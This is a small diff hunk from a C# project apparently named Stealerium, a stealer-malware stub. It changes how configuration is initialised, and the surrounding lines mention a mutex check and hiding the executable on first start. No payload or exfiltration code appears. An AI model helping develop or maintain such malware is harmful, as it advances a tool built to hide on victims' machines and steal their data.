@@ -36,7 +36,7 @@ namespace Stealerium.Stub
             MutexControl.Check();
 
             // Initialize configuration
-            await Config.InitAsync();
+            Task.Run(Config.InitAsync).Wait();
 
             // Hide executable on first start
             if (!Startup.IsFromStartup())
